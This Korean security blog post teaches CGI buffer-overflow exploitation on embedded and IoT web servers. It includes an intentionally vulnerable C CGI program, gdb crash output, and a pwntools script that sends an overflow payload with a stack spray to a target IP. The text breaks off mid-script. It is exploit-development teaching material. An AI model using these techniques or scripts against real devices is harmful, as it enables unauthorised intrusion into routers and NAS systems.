<div class="header_image_bg header_image_post" style="background-image: url('/assets/posts/thumbnails/20200619.jpg');">
    <div class="header_image_post_body">
        <div class="container">
            <div class="page-category">R&D</div>
            <div class="page-title">Common ways to exploit CGI Buffer overflow.</div>
            <div class="page-summary">
                <div style="float:left;">
                    <img class="page-profile_image" src="/assets/posts/thumbnails/20200619.jpg" />
                    <span>김도현</span>
                </div>
                <div style="float:right;" class="page-date">Aug 20, 2020</div>
            </div>
        </div>
    </div>
</div>
<div class="container page-content">
    <h1 id="common-ways-to-exploit-cgi-buffer-overflow">Common ways to exploit CGI Buffer overflow.</h1>

<p>다양한 임베디드 서비스 및 IoT에서 사용되는 CGI 프로그램을 공격하는 일반적인 방법에 대해 알아 보겠습니다.</p>

<h2 id="common-gateway-interface">Common Gateway Interface</h2>

<p>CGI는 웹 서버상에서 사용자 프로그램을 동작시키기 위한 조합입니다. 존재하는 많은 웹 서버 프로그램은 CGI의 기능을 이용할 수 있습니다. CGI는 환경변수나 표준입출력을 다룰 수 있는 프로그램 언어에서라면 언어의 구별을 묻지 않고 확장하여 이용하는 것이 가능하나, 실행속도나 텍스트 처리의 용이함 등의 균형에 의해 펄이 사용되는 경우가 많았습니다.[^1]</p>

<p>CGI는 주로 Router, NAS와 같은 다양한 Embeded device, IoT Service를 위해 사용됩니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                | Server
                |
+--------+      |       +-------------+       +-------------+
| Client |&lt;=---HTTP---=&gt;| HTTP Server |&lt;=---=&gt;| CGI Program |
+--------+      |       +-------------+       +-------------+
                |
                |
</code></pre></div></div>

<h3 id="cgi-how-to">CGI: How-to</h3>

<p>Lighttpd<sup id="fnref:2" role="doc-noteref"><a href="#fn:2" class="footnote" rel="footnote">1</a></sup>와 같이 HTTP 프로토콜을 처리하여 CGI 프로그램으로 전달 할 수 있는 웹 서버 역할을 하는 프로그램을 한가지 선정합니다. 그 후에 CGI 규약에 맞게 프로그램을 작성하면 됩니다. 본 챕터에서는 공격하기 위해 알아야하는 몇가지를 설명하겠습니다.</p>

<h4 id="환경변수">환경변수</h4>

<p>환경변수에는 HTTP 프로토콜을 통해 클라이언트에게 제공받은 정보가 저장됩니다.</p>

<p>임의로 변조된 사용자의 값이 전달 될 수 있는 벡터는 다음과 같습니다.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3" class="footnote" rel="footnote">2</a></sup></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">HTTP_COOKIE</code> : 클라이언트의 Cookie입니다.</li>
  <li><code class="language-plaintext highlighter-rouge">HTTP_USER_AGENT</code> : 클라이언트의 User agent입니다.</li>
  <li><code class="language-plaintext highlighter-rouge">QUERY_STRING</code> : 클라이언트에게 제공받은 <code class="language-plaintext highlighter-rouge">GET</code> 쿼리 문자열입니다.</li>
</ul>

<h4 id="표준입출력">표준입출력</h4>

<p>표준 출력을 통해 cgi 페이지로 접근한 클라이언트에게 그 내용을 전달할 수 있습니다.</p>

<p><code class="language-plaintext highlighter-rouge">POST</code>와 같은 HTTP Method를 서비스 하기 위해 CGI에서는 표준입력을 사용합니다. <code class="language-plaintext highlighter-rouge">POST</code>의 데이터를 전달 받기 위해서는 단순히 표준입력을 받기만 하면 우리는 <code class="language-plaintext highlighter-rouge">POST</code>를 통해 전달 된 데이터를 받아낼 수 있습니다.</p>

<h2 id="cgi-공격">CGI 공격</h2>

<p><strong>vuln.c</strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
</span>
<span class="kt">char</span> <span class="o">*</span><span class="n">param</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">param_count</span><span class="p">;</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="kt">char</span> <span class="nf">h2c</span><span class="p">(</span><span class="kt">char</span> <span class="n">h</span><span class="p">)</span> <span class="c1">// F -&gt; 15</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">&gt;=</span> <span class="sc">'a'</span> <span class="o">&amp;&amp;</span> <span class="n">h</span> <span class="o">&lt;=</span> <span class="sc">'f'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">h</span> <span class="o">-</span> <span class="sc">'a'</span> <span class="o">+</span> <span class="mh">0xa</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">h</span> <span class="o">&gt;=</span> <span class="sc">'A'</span> <span class="o">&amp;&amp;</span> <span class="n">h</span> <span class="o">&lt;=</span> <span class="sc">'F'</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">h</span> <span class="o">-</span> <span class="sc">'A'</span> <span class="o">+</span> <span class="mh">0xa</span><span class="p">;</span>
    <span class="k">return</span> <span class="n">h</span> <span class="o">-</span> <span class="sc">'0'</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="nf">u2c</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">u</span><span class="p">)</span> <span class="c1">// %00 -&gt; \x00</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">u</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="n">h2c</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">u</span><span class="o">+</span><span class="mi">1</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">;</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="n">h2c</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">u</span><span class="o">+</span><span class="mi">2</span><span class="p">))</span> <span class="o">*</span> <span class="mh">0x01</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">urldecode</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">s</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">index1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">index2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'?'</span><span class="p">)</span>
        <span class="n">index2</span><span class="o">++</span><span class="p">;</span>

    <span class="n">param</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
    <span class="n">param_count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">while</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">])</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'%'</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">u2c</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">index2</span><span class="p">);</span>
            <span class="n">index2</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'&amp;'</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>
            <span class="n">index2</span><span class="o">++</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'='</span><span class="p">)</span>
                <span class="n">param_count</span><span class="o">++</span><span class="p">;</span>
            <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">[</span><span class="n">index2</span><span class="o">++</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">s</span><span class="p">[</span><span class="n">index1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">get_val</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">param_c</span> <span class="o">=</span> <span class="n">param</span><span class="p">;</span>
    <span class="kt">size_t</span> <span class="n">param_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_c</span><span class="p">);</span>
    <span class="kt">size_t</span> <span class="n">name_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">param</span> <span class="o">||</span> <span class="o">!</span><span class="n">param_count</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"no query.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">param_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">param_c</span><span class="p">,</span> <span class="n">name_len</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">param_c</span><span class="p">[</span><span class="n">name_len</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'='</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">param_c</span> <span class="o">+=</span> <span class="n">name_len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
            <span class="n">strncpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">param_c</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
            <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span>
        <span class="p">{</span>
            <span class="n">param_c</span> <span class="o">+=</span> <span class="n">param_len</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
            <span class="n">param_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_c</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">urldecode</span><span class="p">(</span><span class="n">getenv</span><span class="p">(</span><span class="s">"QUERY_STRING"</span><span class="p">)))</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"urldecode error.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">));</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"time"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"echo '- time ------' &gt;&gt; /tmp/out &amp;&amp; date &gt;&gt; /tmp/out;"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"ifconfig"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"echo '- ifconfig --' &gt;&gt; /tmp/out &amp;&amp; ifconfig bond0 &gt;&gt; /tmp/out;"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"uname"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">)</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="s">"echo '- uname -----' &gt;&gt; /tmp/out &amp;&amp; uname -a &gt;&gt; /tmp/out;"</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"rm -f /tmp/out"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/out"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">out</span><span class="p">));</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">get_val</span><span class="p">(</span><span class="s">"comment"</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">))</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위 샘플 코드는 시스템의 <code class="language-plaintext highlighter-rouge">time</code>, <code class="language-plaintext highlighter-rouge">ifconfig</code>, <code class="language-plaintext highlighter-rouge">uname</code>의 결과값을 출력 해 주는 간단한 프로그램입니다.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">L109</code>
<code class="language-plaintext highlighter-rouge">QUERY_STRING</code>을 통해 인풋 받는 <code class="language-plaintext highlighter-rouge">GET</code> Query의 디코딩을 처리합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L119~124</code>
<code class="language-plaintext highlighter-rouge">time</code>, <code class="language-plaintext highlighter-rouge">ifconfig</code>, <code class="language-plaintext highlighter-rouge">uname</code>을 실행하는 명령어 조합을 <code class="language-plaintext highlighter-rouge">cmd</code> 버퍼에 복사합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L126~127</code>
<code class="language-plaintext highlighter-rouge">/tmp/out</code>을 삭제 후 <code class="language-plaintext highlighter-rouge">cmd</code> 버퍼의 내용대로 명령어를 실행합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L129~133</code>
<code class="language-plaintext highlighter-rouge">/tmp/out</code> 파일을 읽어 <code class="language-plaintext highlighter-rouge">out</code>버퍼에 복사합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L135~136</code>
<code class="language-plaintext highlighter-rouge">comment</code> 의 값이 유효할 경우 그 값을 <code class="language-plaintext highlighter-rouge">out</code> 버퍼에 복사합니다.</li>
  <li><code class="language-plaintext highlighter-rouge">L138</code>
<code class="language-plaintext highlighter-rouge">out</code>을 출력합니다.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">L136</code>에서 <code class="language-plaintext highlighter-rouge">strncat</code> 대신 <code class="language-plaintext highlighter-rouge">strcat</code><sup id="fnref:4" role="doc-noteref"><a href="#fn:4" class="footnote" rel="footnote">3</a></sup>을 사용하기 때문에, <code class="language-plaintext highlighter-rouge">out</code> 버퍼에 이미 많은 양의 데이터가 채워져 있을 경우의 예외를 처리하지 않습니다. 이로 인해 Buffer overflow<sup id="fnref:5" role="doc-noteref"><a href="#fn:5" class="footnote" rel="footnote">4</a></sup>가 발생하게 됩니다.</p>

<h3 id="취약점-증명">취약점 증명</h3>

<p>취약점을 증명하기 위해 간단히 웹 브라우저를 사용할 수 있습니다.</p>

<p><img src="/assets/2020-08-20-cgi_exploit.assets/image-20200819160551819.png" alt="image-20200819160551819" /></p>

<p>위는 정상적인 프로그램의 실행 흐름을 나타냅니다.</p>

<p><img src="/assets/2020-08-20-cgi_exploit.assets/image-20200819160732064.png" alt="image-20200819160732064" /></p>

<p>위는 다수의 데이터를 <code class="language-plaintext highlighter-rouge">comment</code> 파라미터를 통해 전달 할 경우를 보여줍니다.</p>

<p>Lighttpd의 경우 다음과 같이 core dump를 활성화 시킬 수 있습니다. cgi 프로그램이 존재하는 디렉토리에 core dump가 생성됩니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo 'server.core-files = "enable"' &gt;&gt; /etc/lighttpd.conf
$ kill -9 `pidof lighttpd`
$ lighttpd -f /etc/lighttpd.conf -m /usr/local/lib
</code></pre></div></div>

<p>그 후, 해당 프로그램의 core dump를 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/314ckC47 # ./gdb -q -c /path/to/core
[New LWP 6007]
Core was generated by `vuln.cgi'.
Program terminated with signal 11, Segmentation fault.
#0  0x61616160 in ?? ()
(gdb) i r pc
pc             0x61616160       0x61616160
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">$pc</code> 레지스터가 변조 된 것을 알 수 있습니다.</p>

<h3 id="공격-제약">공격 제약</h3>

<p>일반적인 BOF 공격은 Return Oriented Programming(ROP)<sup id="fnref:6" role="doc-noteref"><a href="#fn:6" class="footnote" rel="footnote">5</a></sup>을 주로 사용합니다.</p>

<p>하지만 이번 취약점을 공격하기에는 몇가지 제약이 있습니다.</p>

<ul>
  <li>문자열 복사를 통해 발생하는 Buffer overflow이기 때문에, ROP Payload에 Null byte가 포함 될 경우 성공적으로 공격을 수행할 수 없습니다.</li>
  <li>공격에 사용할 수 있는 정적인 주소가 프로그램(vuln.cgi)이 로드 된 지점밖에 없습니다.</li>
  <li>프로그램이 로드 된 주소값의 상위 1바이트는 Null-byte입니다.</li>
</ul>

<p>이런 상황에서 구상할 수 있는 Payload는 다음과 같습니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;= 0x00000000                       0xffffffff =&gt;
+-----+-(out)---------------+-(BP)-+-(PC)-+-----+
| ... | ............ 'a'*63 | BASE | JUMP | ... |
+-----+---------------------+------+------+-----+
                      === Overflow ==&gt;
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">JUMP</code>에는 상위 1바이트가 Null-byte인 주소값을 삽입할 수 있습니다.</li>
  <li><code class="language-plaintext highlighter-rouge">BASE</code>에는 Null-byte가 존재하지 않는 어떤 값을 삽입할 수 있습니다.</li>
</ul>

<p>이런 모든 조건을 종합 해 보았을 때, 우리는 다음과 같이 공격을 구상해야합니다.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">PC</code>를 단 한번 변조하여 공격자가 원하는 코드의 흐름을 획득 해야합니다.
    <ul>
      <li>연속적인 함수의 호출 또는 인자의 구성을 위해 Null-byte를 삽입할 수 있는 영역이 필요합니다.</li>
      <li>연속적인 함수의 호출 또는 인자의 구성을 위해 <code class="language-plaintext highlighter-rouge">SP</code>를 변조할 수 있어야 합니다.</li>
    </ul>
  </li>
</ul>

<h3 id="stack-spray">Stack spray</h3>

<p><code class="language-plaintext highlighter-rouge">QUERY_STRING</code> 환경변수는 스택에 저장되어 있습니다. 이를 활용하면 다음과 같이 Stack spray를 시도 할 수 있습니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">):</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="s">""</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"GET http://{}/vuln.cgi?{} HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Host: {}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Connection: keep-alive</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Content-Length: 0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"User-Agent: Mozilla/5.0</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept: */*</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Origin: http://{}</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Referer: http://{}/home.cgi</span><span class="se">\r\n</span><span class="s">"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Encoding: gzip, deflate</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="n">packet</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\r\n</span><span class="s">"</span>
    <span class="k">return</span> <span class="n">packet</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">form_param</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">spray</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"&amp;"</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">"ifconfig=y"</span><span class="p">,</span> <span class="s">"comment="</span><span class="o">+</span><span class="n">payload</span><span class="p">,</span> <span class="s">"s="</span><span class="o">+</span><span class="n">spray</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">63</span> <span class="o">+</span> <span class="s">"STCK"</span> <span class="o">+</span> <span class="s">"JUMP"</span>
    <span class="n">spray</span>   <span class="o">=</span> <span class="s">'b'</span><span class="o">*</span><span class="mh">0x10000</span>
    <span class="n">param</span>   <span class="o">=</span> <span class="n">form_param</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">spray</span><span class="p">)</span>
    <span class="n">packet</span>  <span class="o">=</span> <span class="n">form_packet</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">param</span><span class="p">)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="mi">80</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">):</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"{} [target-ip]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</code></pre></div></div>

<p>실제로 스택에 스프레이가 되었는지 확인합니다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) x/16wx $sp+0x380
0xbec65db8:     0x61616161      0x61616161      0x61616161      0x61616161
0xbec65dc8:     0x64646161      0x44446464      0x73004444      0x6262623d
0xbec65dd8:     0x62626262      0x62626262      0x62626262      0x62626262
0xbec65de8:     0x62626262      0x62626262      0x62626262      0x62626262
(gdb) x/16wx $sp+0x380+0x10000
0xbec75db8:     0x62626262      0x62626262      0x62626262      0x62626262
0xbec75dc8:     0x62626262      0x62626262      0x62626262      0x45520062
0xbec75dd8:     0x53455551      0x52555f54      0x762f3d49      0x2e6e6c75
0xbec75de8:     0x3f696763      0x6f636669      0x6769666e      0x6326793d
(gdb)
</code></pre></div></div>

<p>스프레이가 잘 되었음을 확인 했습니다.</p>

<p>또한 Null-byte의 삽입이 가능한지의 여부를 확인합니다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ...
</span><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">63</span> <span class="o">+</span> <span class="s">'dddd'</span> <span class="o">+</span> <span class="s">'DDDD'</span>
    <span class="n">spray</span>   <span class="o">=</span> <span class="s">'%00'</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10000</span><span class="o">-</span><span class="mi">12</span><span class="p">)</span>
